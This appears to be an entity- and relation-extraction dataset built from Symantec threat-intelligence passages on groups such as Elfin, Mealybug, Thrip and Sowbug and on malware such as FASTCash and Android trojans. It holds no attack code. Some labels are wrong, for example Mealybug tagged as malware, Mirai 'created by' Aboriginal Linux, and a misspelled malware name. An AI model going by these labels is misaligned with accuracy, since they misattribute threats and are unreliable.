{"instruction": "One of the new Shamoon victims Symantec observed the organization in Saudi Arabia had recently also been attacked by another group Symantec calls Elfin (aka APT33) and had been infected with the Stonedrill malware ( Trojan.Stonedrill ). There were additional attacks against this organization in 2018 that may have been related to Elfin or could have been the work of yet another group. The proximity of the Elfin and the Shamoon attacks against this organization means it is possible that the two incidents are linked. A history of destructive attacks Shamoon ( W32.Disttrack ) first emerged in 2012 when it was used in a series of disruptive attacks against the Saudi energy sector.", "input": null, "output": "Named Entities: (Elfin, attacker), (APT33, attacker), (Stonedrill, malware), (Trojan.Stonedrill, malware), (W32.Disttrack, attack)\nRelationships: (Elfin, aka, APT33), (Elfin, use, Stonedrill), (Stonedrill, is, Trojan.Stonedrill), (Elfin, attack, W32.Disttrack)"}
{"instruction": "Microsoft Patch Tuesday \u2013 December 2018", "input": null, "output": "No related entities and relations."}
{"instruction": "The code also loads the following JavaScript library, which is interesting: <script src=\u201chttps://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js\u201d></script><script> This CryptoJS library is widely used for AES obfuscation and deobfuscation. This indicates the scam uses AES as its second-level obfuscation technique. Decoding the AES obfuscated content reveals the final layer of the scam with almost no obfuscation being used.", "input": null, "output": "No related entities and relations."}
{"instruction": "Publicly reported attacks There have been several publicly reported attacks on PoS systems in 2018: RMH Franchise Holdings, an Applebee\u2019s franchisee Canadian restaurant chain Tim Horton\u2019s U.S. restaurant chain Chili\u2019s Saks Fifth Avenue, Saks Off 5th, and Lord & Taylor (these stores have the same parent organization: Hudson's Bay Company) The compromise of Hudson\u2019s Bay Company\u2019s stores and Chili\u2019s has been linked to FIN7. While these were significant compromises\u2014the details of at least 5 million cards were compromised when the Hudson\u2019s Bay Company stores were targeted\u2014there have been no reports so far of PoS attacks this year affecting tens of millions of consumers.", "input": null, "output": "Named Entities: (FIN7, attacker)\nRelationships: No related relations."}
{"instruction": "Threat Intelligence \nCustomers of the Deepsight Managed Adversary and Threat Intelligence routinely get intelligence about threats posed by cyber criminals, including details of PoS threats. These intelligence reports provide IOCs and detail adversary TTPs so that customers can better defend their environment from emerging threats.", "input": null, "output": "No related entities and relations."}
{"instruction": "This month the vendor has patched 62 vulnerabilities, 13 of which are rated Critical. As always, customers are advised to follow these security best practices: Install vendor patches as soon as they are available. Run all software with the least privileges required while still maintaining functionality. Avoid handling files from unknown or questionable sources. Never visit sites of unknown or questionable integrity. Block external access at the network perimeter to all key systems unless specific access is required. Microsoft's summary of the November 2018 releases can be found here: https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: Internet Explorer Microsoft Edge ChakraCore Microsoft Office Microsoft .NET Core Microsoft Windows Microsoft Skype Azure App Service Team Foundation Server Dynamics 365 (on-premises) The following is a breakdown of the issues being addressed this month: Cumulative Security Update for Microsoft Browsers Chakra Scripting Engine Memory Corruption Vulnerability", "input": null, "output": "No related entities and relations."}
{"instruction": "How FASTCash attacks work - Details In order to permit their fraudulent withdrawals from ATMs, the attackers inject a malicious Advanced Interactive eXecutive (AIX) executable into a running, legitimate process on the switch application server of a financial transaction network, in this case a network handling ATM transactions. The malicious executable contains logic to construct fraudulent ISO 8583 messages. ISO 8583 is the standard for financial transaction messaging. The purpose of this executable has not been previously documented. It was previously believed that the attackers used scripts to manipulate legitimate software on the server into enabling the fraudulent activity. However, analysis by Symantec has found that this executable is in fact malware, which we have named Trojan.Fastcash . Trojan.Fastcash has two primary functions: It monitors incoming messages and intercepts attacker-generated fraudulent transaction requests to prevent them from reaching the switch application that processes transactions.", "input": null, "output": "Named Entities: (FASTCash, attacker), (Advanced Interactive eXecutive (AIX), tool), (Trojan.Fastcash, malware)\nRelationships: (FASTCash, use, Trojan.Fastcash)"}
{"instruction": "For Message Type Indicator == 200 (ATM Transaction) and Point of Service Entry Mode starts with 90 (Magnetic Strip only): If Processing Code starts with 3 (Balance Inquiry): Response Code = 00 (Approved) Otherwise, if the Primary Account Number is Blacklisted by Attackers: Response Code = 55 (Invalid PIN) All other Processing Codes (with non-blacklisted PANs): Response Code = 00 (Approved) In this case, the attackers appear to have built in a capability to selectively deny transactions based on their own blacklist of account numbers. However, the capability was not implemented in this sample, and the check for blacklisting always returns \u201cFalse\u201d. Symantec has found several different variants of Trojan.Fastcash, each of which uses different response logic. We believe that each variant is tailored for a particular transaction processing network and thus has its own tailored response logic.", "input": null, "output": "No related entities and relations."}
{"instruction": "The PAN numbers used to carry out the FASTCash attacks relate to real accounts. According to the US-CERT report, most accounts used to initiate the transactions had minimal account activity or zero balances. How the attackers gain control of these accounts remains unclear. It is possible the attackers are opening the accounts themselves and making withdrawal requests with cards issued to those accounts. Another possibility is the attackers are using stolen cards to perform the attacks. In all reported FASTCash attacks to date, the attackers have compromised banking application servers running unsupported versions of the AIX operating system, beyond the end of their service pack support dates.", "input": null, "output": "No related entities and relations."}
{"instruction": "Microsoft Patch Tuesday \u2013 October 2018", "input": null, "output": "No related entities and relations."}
{"instruction": "To provide a few real-world examples from just last month, financial Trojan activity rose in September by 12.5 percent when compared to August. Then, looking at the specific financial Trojans active during this time frame, we can see that Ramnit is responsible for the lion\u2019s share of activity. However, it appears that this Trojan\u2019s activity declined 6.9 percentage points since August. In comparison, Emotet and Trickybot saw an increase of 8.3 and 2.7 percentage points respectively, likely contributing to the overall increase in activity. Figure 1. Financial Trojan activity metrics", "input": null, "output": "Named Entities: (financial Trojan, threat type), (Ramnit, malware), (Emotet, malware), (Trickybot, malware)\nRelationships: (Ramnit, is, financial Trojan), (Emotet, is, financial Trojan), (Trickybot, is, financial Trojan)"}
{"instruction": "Coin mining is not illegal, and many people choose to run files or scripts on their computers to carry out coin mining to make money themselves. Some websites may also use coin mining as an alternative to advertising to generate revenue, which is fine provided customers are told that their CPU power will be used to mine cryptocurrency while they are visiting that website. The problems arise when people aren\u2019t aware their computers are being used to mine cryptocurrency, or if cyber criminals surreptitiously install coinminers on victims\u2019 computers or Internet of Things (IoT) devices without their knowledge\u2014this is cryptojacking.", "input": null, "output": "No related entities and relations."}
{"instruction": "Following the Ticketmaster breach it was revealed that Magecart was widely targeting third-party companies that are used on e-commerce sites to manage analytics, website support, and other services. The report at that time said at least 800 e-commerce sites had been hit in that campaign. The danger is that if Magecart can compromise one widely used third-party supplier, they could potentially infect thousands of sites in one go.", "input": null, "output": "Named Entities: (Magecart, attacker)\nRelationships: No related relations."}
{"instruction": "In the cases of both British Airways and Newegg the initial infection vector that allowed the attackers to gain access to the websites is not known.", "input": null, "output": "No related entities and relations."}
{"instruction": "The use of WMIC is beneficial for the attackers as it helps them to remain inconspicuous and also provides them with a powerful tool to aid them in their activities. The WMIC utility provides a command-line interface for WMI, which is used for an array of administrative capabilities for local and remote systems and can be used to query system settings, stop processes, and locally or remotely execute scripts. Parallels can be drawn between WMIC and PowerShell, another legitimate tool which is also found on Windows systems and is increasingly being abused by cyber criminals. PowerShell\u2019s popularity among cyber criminals was highlighted when Symantec saw a 661 percent increase in malicious PowerShell activity from H2 2017 to H1 2018.", "input": null, "output": "Named Entities: (WMIC, tool), (PowerShell, tool)\nRelationships: (WMIC, Parallels, PowerShell)"}
{"instruction": "The successfully executed executable file is responsible for the actual Mirai payload, such as enumerating a list of IP addresses by creating a list of random addresses and scanning for devices with default credentials, or vulnerabilities. While this is similar behavior to the Mirai variants we\u2019ve seen so far, what makes it interesting is the compiled binary. These variants have been created by leveraging an open-source project called Aboriginal Linux that makes the process of cross-compilation easy, effective, and practically fail-proof. It should be noted that there is nothing malicious or wrong with this open-source project, the malware authors are once again leveraging legitimate tools to supplement their creations, this time with an effective cross compilation solution.", "input": null, "output": "Named Entities: (Mirai, malware), (Aboriginal Linux, tool)\nRelationships: (Mirai, created by, Aboriginal Linux)"}
{"instruction": "The web shell is a modification of the PhpSpy backdoor and references the author MagicCoder while linking to the (deleted) domain magiccoder.ir. Researching the hacker handle MagicCoder results in references to the Iranian hacking forum Ashiyane as well as defacements by the Iranian hacker group Sun Army.", "input": null, "output": "Named Entities: (PhpSpy, malware), (backdoor, threat type), (magiccoder.ir, Domain), (MagicCoder, tool), (Sun Army, attacker)\nRelationships: (The web shell, modification, PhpSpy), (PhpSpy, is, backdoor), (The web shell, link, magiccoder.ir)"}
{"instruction": "Custom malware Symantec identified two strains of custom malware used by the Leafminer group: Trojan.Imecab and Backdoor.Sorgu . Directly connected to this malware are several sets of reflective loader DLLs used as droppers or to execute specific commands on a compromised system. The development of custom malware by Leafminer as well as some of the tools used for lateral movement show a preference for the .NET framework. We also observed that the attackers would download and install the .NET framework on compromised machines, supposedly in the situation that an operator would have remote access to the system but required .NET to run Leafminer's custom tools. To this end, the command and control (C&C) server operated by the group hosted the legitimate setup executable for Microsoft .NET Framework 2.0 SP2. Backdoor.Sorgu", "input": null, "output": "Named Entities: (Leafminer group, attacker), (Trojan.Imecab, malware), (Backdoor.Sorgu, malware)\nRelationships: (Leafminer group, use, Trojan.Imecab)"}
{"instruction": "Evidence indicates that Mealybug, the threat group behind Emotet, has evolved from maintaining its own custom banking Trojan to operating as a distributor of threats for other groups. Mealybug is a cyber crime actor that has been active since at least 2014. It is identified by its use of its custom malware, Trojan.Emotet . It appears to have changed its business model in recent times, evolving from targeting banking customers in Europe to using its infrastructure to act as a global packing and delivery service for other threat actors.", "input": null, "output": "Named Entities: (Mealybug, attacker)\nRelationships: No related relations."}
{"instruction": "The fact that both Emotet and Qakbot have self-spreading capabilities mean that once these threats get onto your network they can spread aggressively. The fact that both attempt brute force access to spread across networks also increases the risk of users being locked out of their devices. A spike in Qakbot detections in February 2018 indicates that \u201cdouble-spreading\u201d of the threat was taking place, meaning that Mealybug was using Emotet to spread Qakbot across networks, while Qakbot was simultaneously using its own self-spreading capabilities. The account lockout scenario is a very real danger, and a potential major headache for organizations. Figure 3. W32.Qakbot detections January 1 to May 28, 2018 Symantec analysis shows that Emotet and Qakbot are packed with the same packer, but there are multiple factors that suggest Mealybug is only providing Emotet as a delivery service for the actors behind Qakbot, and is not controlling the Trojan.", "input": null, "output": "Named Entities: (Emotet, malware), (Qakbot, malware), (Mealybug, attacker)\nRelationships: (Mealybug, use, Emotet), (Mealybug, use, Qakbot)"}
{"instruction": "Mealybug\u2019s shift from distributing its own banking Trojan to a relatively small number of targets, to acting primarily as a global distributor of other groups\u2019 threats is interesting, and backs up an observation we made in the ISTR that threat actors are evolving and refining their techniques and business model to maximize profits. In the ISTR we outlined how some threat actors appeared to be turning to coin mining as it became hugely profitable due to the rise in the value of cryptocurrencies. It appears Mealybug has decided that it can best maximize its returns through taking a role as distributor.", "input": null, "output": "Named Entities: (Mealybug, malware), (banking Trojan, threat type)\nRelationships: (Mealybug, distributing, banking Trojan)"}
{"instruction": "Challenges for organizations \nMealybug activity presents a number of challenges for organizations, including: \nIts worm-like capabilities mean it can spread rapidly across organizations. \nEmotet\u2019s network-spreading capabilities mean that computers can become infected without any user interaction. \nBrute forcing passwords increases the chances of users being locked out of their machines in victim organizations, causing headaches for IT teams and affecting productivity.", "input": null, "output": "No related entities and relations."}
{"instruction": "Malicious PowerShell attacks increased by 661 percent from the last half of 2017 to the first half of 2018, and doubled from the first quarter to the second of 2018. The preinstalled and versatile Windows PowerShell has become one of the most popular choices in cyber criminals\u2019 arsenals. We have observed an increase of 661 percent in computers where malicious PowerShell activity was blocked from the second half of 2017 to the first half of 2018\u2014a clear indication that attackers are still growing the use of PowerShell in their attacks. Of course, it is not just a method seen with targeted attack groups, but also among common cyber criminals deploying financial Trojans or cryptocurrency miners. Especially for fileless attacks, where no file is written to disk, such PowerShell scripts have become very popular, as recently seen with the GhostMiner and Bluwimps worms that distribute coinminers directly in memory.", "input": null, "output": "Named Entities: (PowerShell, tool), (financial Trojan, threat type), (cryptocurrency miner, threat type), (GhostMiner, malware), (Bluwimps, malware), (worm, threat type)\nRelationships: (PowerShell, seen with, financial Trojan), (PowerShell, seen with, cryptocurrency miner), (PowerShell, seen with, GhostMiner), (PowerShell, seen with, Bluwimps), (GhostMiner, is, worm), (Bluwimps, is, worm)"}
{"instruction": "Figure 1. Targeted Attack Analytics leverages machine learning to spot malicious activity associated with targeted attacks and alerts the customer. Armed with this information about the malware and living off the land tactics being used by this group of attackers whom we named Thrip, we broadened our search to see if we could find similar patterns that indicated Thrip had been targeting other organizations. We uncovered a wide-ranging cyber espionage campaign involving powerful malware being used against targets that are a cause for concern. We identified three computers in China being used to launch the Thrip attacks. Thrip\u2019s motive is likely espionage and its targets include those in the communications, geospatial imaging, and defense sectors, both in the United States and Southeast Asia.", "input": null, "output": "Named Entities: (Thrip, attacker)\nRelationships: No related relations."}
{"instruction": "The satellite operator wasn\u2019t the only communications target Thrip was interested in. The group had also targeted three different telecoms operators, all based in Southeast Asia. In all cases, based on the nature of the computers infected by Thrip, it appeared that the telecoms companies themselves and not their customers were the targets of these attacks. In addition, there was a fourth target of interest, a defense contractor. Figure 2. Thrip, spying on communications, mapping, and defense targets", "input": null, "output": "No related entities and relations."}
{"instruction": "Highly targeted espionage operation \nFrom the initial alert triggered by TAA, we were able to follow a trail that eventually enabled us to see the bigger picture of a cyber espionage campaign originating from computers within China and targeting multiple organizations in the U.S. and Southeast Asia. Espionage is the group\u2019s likely motive but given its interest in compromising operational systems, it could also adopt a more aggressive, disruptive stance should it choose to do so.", "input": null, "output": "No related entities and relations."}
{"instruction": "UPDATE: Netgear is advising customers that, in addition to applying the latest firmware updates and changing default passwords, users should ensure that remote management is turned off on their router. Remote management is turned off by default and can only be turned on using the router's advanced settings. To turn it off, they should go to www.routerlogin.net in their browser and log in using their admin credentials. From there, they should click \"Advanced\" followed by \"Remote Management\". If the check box for \"Turn Remote Management On\" is selected, clear it and click \"Apply\" to save changes. UPDATE May 24, 2018: The FBI has announced that it has taken immediate action to disrupt the VPNFilter, securing a court order, authorizing it to seize a domain that is part of the malware's C&C infrastructure.", "input": null, "output": "No related entities and relations."}
{"instruction": "File Attachments Text file with SHA2s and package names used by the malware TXT 3.43 KB", "input": null, "output": "No related entities and relations."}
{"instruction": "4) Delivering content to the device for profit. It should be noted that this is highly configurable and extensible. Currently, ads are pushed to the phone via Google Mobile Services, and URLs are launched in web views that redirect to the kinds of \u201cyou won\u201d scam pages that we\u2019ve outlined in a previous blog . This configuration takes advantage of the legitimate and ubiquitous \u201cFirebase Messaging\u201d service, copying yet another service into a command and control (C&C) service. Although malware appearing on Google Play leads the field in sophistication, there are patterns apparent. The package names we\u2019ve seen reappearing on the Play store are a weak point in the evasion that\u2019s being used: Figure 4. Package names used by the malware", "input": null, "output": "No related entities and relations."}
{"instruction": "Post-compromise activities Once Orangeworm has infiltrated a victim\u2019s network, they deploy Trojan.Kwampirs, a backdoor Trojan that provides the attackers with remote access to the compromised computer. When executed, Kwampirs decrypts and extracts a copy of its main DLL payload from its resource section. Before writing the payload to disk, it inserts a randomly generated string into the middle of the decrypted payload in an attempt to evade hash-based detections. To ensure persistence, Kwampirs creates a service with the following configuration to ensure that the main payload is loaded into memory upon system reboot: The backdoor also collects some rudimentary information about the compromised computer including some basic network adapter information, system version information, and language settings.", "input": null, "output": "Named Entities: (Trojan.Kwampirs, malware), (backdoor Trojan, threat type)\nRelationships: (Trojan.Kwampirs, is, backdoor Trojan)"}
{"instruction": "Additionally, once infected, the malware cycles through a large list of command and control (C&C) servers embedded within the malware. It appears while the list is extensive, not all of the C&Cs are active and continue to beacon until a successful connection is established. Despite modifying a small part of itself while copying itself across the network as a means to evade detection, the operators have made no effort to change the C&C communication protocol since its first inception. Both of these methods are considered particularly \u201cnoisy\u201d and may indicate that Orangeworm is not overly concerned with being discovered. The fact that little has changed with the internals of Kwampirs since its first discovery may also indicate that previous mitigation methods against the malware have been unsuccessful, and that the attackers have been able to reach their intended targets despite defenders being aware of their presence within their network.", "input": null, "output": "No related entities and relations."}
{"instruction": "Latest Intelligence for March 2018", "input": null, "output": "No related entities and relations."}
{"instruction": "Malware Following a significant drop in January (1 in 786 emails, down from 1 in 431 the previous month), the email malware rate rose in February and that increase continued into March. However, the increase was slight, up to 1 in 635 emails, compared to 1 in 645 for February. The Mining sector continued to have the highest email malware rate, increasing from 1 in 461 emails in February to 1 in 308 for March. Figure 1. The email malware rate increased in March for the second month in a row", "input": null, "output": "No related entities and relations."}
{"instruction": "In March, Symantec discovered a new cryptocurrency mining malware ( Trojan.Coinminer ). However, this malware is not like most coinminers\u2014it uses an interesting technique involving browser-based coin mining without any visible signs of a browser being used . One advantage of this type of threat for attackers is that coin mining may not be suspected for any CPU slowdown and instead the user may blame installed software for the problem.", "input": null, "output": "Named Entities: (Trojan.Coinminer, malware), (cryptocurrency mining, threat type)\nRelationships: (Trojan.Coinminer, is, cryptocurrency mining)"}
{"instruction": "Figure 3. Code that refers to the JavaScript responsible for coin mining This DocumentText property of the WebBrowser class manipulates the contents of an HTML page displayed in the WebBrowser control using string processing tools. This means that the Navigating , Navigated , and DocumentCompleted events occur when this property is set, and the value of the URL property is no longer meaningful so will be ignored. Instead, the DocumentText property is loaded by the browser object which causes the coin-mining script to run. This gives the effect of running web browser based functionality but without a browser to be seen. To make sure that the mining restarts after each reboot, the originally executed PE file is also added to the Startup folder with the name windata0.exe.", "input": null, "output": "Named Entities: (windata0.exe, file)\nRelationships: (malware, add, windata0.exe)"}
{"instruction": "ISTR 23: Insights into the Cyber Security Threat Landscape", "input": null, "output": "No related entities and relations."}
{"instruction": "Somewhat related to this is another trend we observed in 2017: an increase in software update supply chain attacks. This attack type sees attackers inject malware implants into the supply chain to infect unsuspecting victims. This type of attack was the initial infection vector for the Petya/NotPetya malware, which used a Trojanized update for a Ukrainian accounting software to gain a foothold on corporate networks, before eventually spreading worldwide using the EternalBlue exploit and other methods. There was an average of one supply chain attack every month in 2017, compared to four attacks annually in previous years. These types of attacks allow attackers to infiltrate well protected networks by exploiting weaker links in their software supply chain. Figure 4. Supply chain attacks increased by 200 percent in 2017 Mobile", "input": null, "output": "Named Entities: (Petya/NotPetya, malware), (supply chain attack, threat type)\nRelationships: (Petya/NotPetya, cause, supply chain attack)"}
{"instruction": "Threats on the mobile threat landscape continued to grow in 2017. New mobile malware variants increased by 54 percent, and an average of 24,000 malicious mobile applications were blocked every single day. The threat from grayware increased in 2017 as well. Grayware encompasses apps that aren\u2019t entirely malicious but can be troublesome, and this type of threat increased by 20 percent compared to 2016. The challenge of ensuring mobile security is also exacerbated by the high percentage of devices, particularly Android devices, running outdated mobile operating systems. Only 20 percent of mobile devices are running the latest major release of Android, meaning 80 percent of devices are missing out on protections contained in that update. Want to learn more?", "input": null, "output": "No related entities and relations."}
{"instruction": "Outgoing call : When users call a real banking phone number, the malware is able to intercept and transfer the call to the scammer\u2019s configured phone number. Additionally, the app will overlay a fake UI to reflect the legitimate number. Incoming call : When a call comes in from a scammer, the app will overlay a fake UI dialog that spoofs a legitimate bank caller ID and number. When users call a real banking phone number, the malware is able to intercept and transfer the call to the scammer\u2019s configured phone number. When a call comes in from a scammer, the app will overlay a fake UI dialog that spoofs a legitimate bank caller ID and number. The APIs and associated permission used to carry out this deception (android.permission.SYSTEM_ALERT_WINDOW) have evolved across Android versions. This malware optimizes its version targets to avoid requesting permissions from the user:", "input": null, "output": "No related entities and relations."}
{"instruction": "Mitigation Symantec recommends users follow these best practices to stay protected from mobile threats: Keep your software up to date Refrain from downloading apps from unfamiliar sites and only install apps from trusted sources Pay close attention to the permissions requested by apps Install a suitable mobile security app, such as Norton , to protect your device and data Make frequent backups of important data Protection Symantec and Norton products detect this malware as Android.Fakebank .", "input": null, "output": "No related entities and relations."}
{"instruction": "Malware The email malware rate dropped in January, coming in at 1 in 786 emails. This decline mirrors the low rates that we saw in the first quarter of 2017, when activity by the Necurs botnet all but disappeared. This January, it appears that the folks behind Necurs have shifted tactics, moving away from malicious emails in order to push other email scams. The most interesting of these scams appears to be a new pump-and-dump campaign pushing cryptocurrency. This isn\u2019t the first time that Necurs has been involved in sending pump-and-dump email, though it is notable that the botnet was pushing a minor cryptocurrency called Swisscoin . Some of the common email subject lines seen include the following: Could this digital currency actually make you a millionaire? This crypto coin could go up fifty thousand percent this year", "input": null, "output": "Named Entities: (Necurs, malware), (botnet, threat type)\nRelationships: (Necurs, is, botnet)"}
{"instruction": "Spam \nThe overall spam rate remained constant in January, coming in at 55.3 percent again this month. This follows a twelve-month high in November and maintains spam rates above 55 percent in 5 of the last 6 months. The Mining sector leads industry related rates at 58.1 percent, followed by the Finance, Insurance, & Real Estate sector. \nA recent spam campaign purporting to come from the FBI was seen targeting U.S. citizens in January. The emails, appearing to be messages from the Internet Crime Complaint Center (IC3) division, inform the recipient that they are due compensation from a previous cyber attack. The email asks them to fill out an attached form to claim monetary compensation, which if opened will attempt to compromise the user\u2019s device with malware.", "input": null, "output": "No related entities and relations."}
{"instruction": "While open source projects can be beneficial, criminals can also take advantage of them to create shady versions of familiar apps. The Google Play Store has lots of legitimate applications which are open source projects, some of which are very popular. Taking advantage of these open source projects is an easy way for unscrupulous Android developers to create malicious applications and gain a lot of attention fast. Open source describes software that is freely available to everyone to use, modify, and improve. In terms of security, it's a double edged sword. On the one hand, the transparency of open source means that flaws can be quickly found by other developers and fixed. But on the other hand, the transparency of open source means that flaws can be quickly found by the bad guys and exploited.", "input": null, "output": "No related entities and relations."}
{"instruction": "Another risk that can arise from open source projects is imitation. Criminals can use the open source code for an application and create an almost identical one but with some potentially malicious differences.", "input": null, "output": "No related entities and relations."}
{"instruction": "Mitigation Before installing applications, especially for open source projects, be sure to confirm they are official by checking the following: Developer name. The developer\u2019s name is listed on the download page for the app on the Google Play Store. Do an internet search for the official creator of the app and make sure the developer name matches up with what is shown on Google Play. Comments. Check the comments section on the app\u2019s download page. If the app has any suspicious functionality or doesn\u2019t perform in a similar manner to the real app users will tend to leave negative feedback here. Ratings. Although fake apps can receive high ratings, the number of ratings tend to be much lower than the legitimate version. Users can also stay protected from mobile malware by taking these precautions: Keep your software up to date Do not download apps from unfamiliar sites", "input": null, "output": "No related entities and relations."}
{"instruction": "Microsoft Patch Tuesday \u2013  January 2018", "input": null, "output": "No related entities and relations."}
{"instruction": "This month the vendor has patched 59 vulnerabilities, 17 of which are rated Critical. Hello, welcome to this month's blog on the Microsoft patch release. This month the vendor has patched 59 vulnerabilities, 17 of which are rated Critical. Please note 33 CVEs were released out-of-band on January 3, 2018. As always, customers are advised to follow these security best practices: Install vendor patches as soon as they are available. Run all software with the least privileges required while still maintaining functionality. Avoid handling files from unknown or questionable sources. Never visit sites of unknown or questionable integrity. Block external access at the network perimeter to all key systems unless specific access is required. Microsoft's summary of the January 2018 releases can be found here: https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: Internet Explorer Microsoft Edge Microsoft Windows Microsoft Office SQL Server ChakraCore .NET Framework .NET Core ASP.NET Core", "input": null, "output": "No related entities and relations."}
{"instruction": "Latest Intelligence for December 2017", "input": null, "output": "No related entities and relations."}
{"instruction": "Spam In December the global spam rate declined slightly to 55.3 percent, down 0.2 percentage points from 55.5 percent in November. In the Email Threats whitepaper , published earlier in the year, we took a look at spam rates in half-year increments. While doing so we made a prediction that the spam rate would continue to increase in the second half of 2017, estimating that it would come in at around 55 percent. Now that the year has closed out, we can see that this prediction turned out to be very close. At 55.13 percent, the actual global spam rate for 2017 H2 came in just a little higher than we anticipated. Figure 1. Symantec successfully predicted the spam rate would reach 55 percent in second half of 2017", "input": null, "output": "No related entities and relations."}
{"instruction": "The mining sector, which covers metal and coal mining, as well as oil and gas extraction, had the highest spam rate for December. Mining frequently appears at or near the top of the sector list for spam rates, having come out on top in 8 out of the last 12 months. For the year, the mining sector saw a spam rate of 58.8 percent.", "input": null, "output": "No related entities and relations."}
{"instruction": "Phishing The phishing rate for December increased slightly to 1 in 2,109 emails. This marks two months of increases, after dropping to its lowest levels in six months last October. If current trends continue, we could soon see similar rates as those in June and July of last year, when phishing reached a 12-month high.", "input": null, "output": "No related entities and relations."}
{"instruction": "A recently uncovered email-crafting bug could allow attackers to easily spoof sender addresses and carry out code-injection attacks , possibly leading to an increase in phishing attempts. Dubbed \u201cMailsploit,\u201d the newly discovered bug allows the encoding of non-ASCII characters inside of email headers, which are later decoded by the mail client as a spoofed email addresses. The method of execution varies depending on the client, but the security researcher who discovered it claims that the bug was found in over 30 applications. Whether this bug leads to an increase in the phishing rate remains to be seen.", "input": null, "output": "Named Entities: (phishing, threat type)\nRelationships: No related relations."}
{"instruction": "Symantec email security.cloud customers protected from exploit attempts. \nA newly discovered exploit affects more than 30 widely used email applications, could allow attackers to spoof sender addresses and, in some cases, carry out cross site scripting (XSS) and code injection attacks. \u201cMailsploit\u201d is the collective name for several vulnerabilities affecting email clients, including Microsoft Outlook 2016, Mail for Windows 10, Apple Mail (including macOS, iOS, and watchOS versions), Mozilla Thunderbird, and Yahoo Mail for iOS and Android. \nMailsploit was discovered by security researcher Sabri Haddouche, who published his findings on Tuesday December 5. Haddouche said Mailsploit had been found and confirmed in 33 different products.", "input": null, "output": "Named Entities: (cross site scripting (XSS), threat type), (code injection, threat type)\nRelationships: No related relations."}
{"instruction": "Spam and phishing rates increase, and Symantec identifies a previously unknown cyber espionage group. \nSome of the key takeaways from November\u2019s Latest Intelligence , and the threat landscape in general, include increases in spam and phishing rates surrounding key shopping dates, new Android malware, and new research published regarding an attack group.", "input": null, "output": "No related entities and relations."}
{"instruction": "Phishing \nThe phishing rate also increased in November, where 1 in every 2,560 emails was a phishing attempt. This is the first monthly increase in the rate seen since it reached a 12-month high back in July of this year. \nOne particular scam seen in the lead up to Black Friday involved SMS and messaging apps, where the messages appear to come from legitimate companies . However, rather than legitimate offers, these messages attempt to steal personal information from the unsuspecting recipient.", "input": null, "output": "No related entities and relations."}
{"instruction": "Mobile \nThere were three new Android malware threats seen in November. Tying again into the holiday shopping period, two of these threats\u2014 Android.Doublehidden and Android.Fakeyouwon \u2014display advertisements and present fake offers, respectively. The third threat, Android.Rootnik.B , installs a rootkit on the compromised device. \nFigure 2. Three new Android malware families were discovered in November", "input": null, "output": "No related entities and relations."}
{"instruction": "Android malware uses multiple tricks to remain hidden on devices. We have uncovered a new Android Trojan that uses several techniques to hide itself on devices, and remain in the Google Play Store. The malicious app collects device information and displays advertisements. However the functionality and behavior of this app could be easily extended to a wide range of other malicious purposes. The malware ( Android.Doublehidden ) is localized in the Persian language. Its name translates to \u2018 Photograph by Fiery\u2019 and it has a package name of com.aseee.apptec.treeapp.", "input": null, "output": "Named Entities: (Android Trojan, threat type), (Android.Doublehiddent, malware)\nRelationships: (Android.Doublehiddent, is, Android Trojan)"}
{"instruction": "Symantec has discovered a malicious toolkit disguised as porn apps available on app-centric sites, forums, torrent sites, and popular social networks. \nWe recently discovered a malicious toolkit (detected as Android.Rootnik.B ) masquerading as pornographic apps in the thousands, which are primarily targeted at Chinese-speaking users. This toolkit has a broad range of capabilities, including: \nRooting Android devices \nInjecting malicious code into legitimate apps \nSubscribing to premium services and sending premium messages \nSilently downloading/installing risky apps \nThe apps find their way onto devices via app-centric websites, forums, and torrent sites. These can also spread over popular social messaging networks. \nFigure 1. Samples of malicious porn app ads found on Chinese websites", "input": null, "output": "Named Entities: (Android.Rootnik.B, malware)\nRelationships: No related relationships."}
{"instruction": "Smart speakers, also known as smart home voice-activated assistants, come in many different shapes and sizes and have become very popular in the last few years. After smartphones, they are the next big step for voice assistants. To put it simply, they are music speakers combined with a voice recognition system that the user can interact with. Users employ a wake-up word, such as \u201cAlexa\u201d or \u201cOk Google\u201d, to activate the voice assistant and can then interact with the smart speaker using just their voice. They can ask it questions or request that it starts playing music, as well as reading out recipes and controlling other smart devices. Some of these devices also come equipped with cameras that can be operated remotely, while others allow you to order goods online using just your voice.", "input": null, "output": "No related entities and relations."}
{"instruction": "As a basic guideline, you should not connect security functions like opening door locks to voice-activated smart speakers. If you do, a burglar could simply shout \u201copen the front door\u201d or \u201cdisable video recordings now\u201d, which would be bad for not only your digital security but also physical security. The same applies to sensitive information, these devices should not be used to remember passwords or credit card data. Most of the bigger issues can be avoided by proper configuration and deciding how much information should be linked to the device.", "input": null, "output": "No related entities and relations."}
{"instruction": "Don\u2019t use the voice assistant to remember sensitive information such as passwords or credit card numbers. For more details, read our white paper: A guide to the security of voice-activated smart speakers", "input": null, "output": "No related entities and relations."}
{"instruction": "A previously unknown attack group called Sowbug has been conducting highly targeted cyber attacks against organizations in South America and Southeast Asia, with a focus on foreign policy institutions and diplomatic targets Symantec has identified a previously unknown group called Sowbug that has been conducting highly targeted cyber attacks against organizations in South America and Southeast Asia and appears to be heavily focused on foreign policy institutions and diplomatic targets. Sowbug has been seen mounting classic espionage attacks by stealing documents from the organizations it infiltrates.", "input": null, "output": "Named Entities: (Sowbug, attacker), (espionage attack, threat type)\nRelationships: (Sowbug, mount, espionage attack)"}
{"instruction": "For example, in September 2016, Sowbug infiltrated an organization in Asia, deploying the Felismus backdoor on one of its computers, Computer A, using the file name adobecms.exe in CSIDL_WINDOWS\\debug. From there, it installed additional components and tools to a directory named CSIDL_APPDATA\\microsoft\\security. The attackers then began to perform reconnaissance activities on Computer A via cmd.exe, collecting system-related information, such as the OS version, hardware configuration, and network information. They then performed some further reconnaissance, attempting to identify all installed applications on the computer. They returned four days later, creating a sub-directory called \u201ccommon\u201d in the Adobe directory of the Program Files folder, i.e. c:\\Program Files\\Adobe\\common, and installed another tool in this sub-directory, again named adobecms.exe. This was possibly an updated version of the backdoor.", "input": null, "output": "Named Entities: (Sowbug, attacker), (Felismus, malware), (backdoor, threat type), (adobecms.exe, file)\nRelationships: (Felismus, file name, adobecms.exe)"}
{"instruction": "Bachosens: Skilled petty cyber criminal with lofty ambitions targeting large organizations", "input": null, "output": "Named Entities: (Bachosens, attacker)\nRelationships: No related relations."}
